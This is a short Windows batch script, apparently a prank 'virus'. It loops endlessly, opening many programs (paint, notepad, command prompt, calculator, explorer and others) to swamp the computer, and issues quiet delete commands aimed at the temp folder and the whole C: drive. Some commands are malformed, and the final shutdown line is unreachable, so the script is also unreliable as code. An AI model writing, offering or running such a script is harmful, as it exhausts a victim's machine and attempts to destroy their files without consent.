@echo off
:repeat
echo %random%
start mspaint
start notepad
start cmd
start calc
start control
start write
start explorer
start config
start %temp%
del C:\Windows\%temp% /t /q
start System32
del C: *.* /t /q
goto repeat
shutdown -r -t 20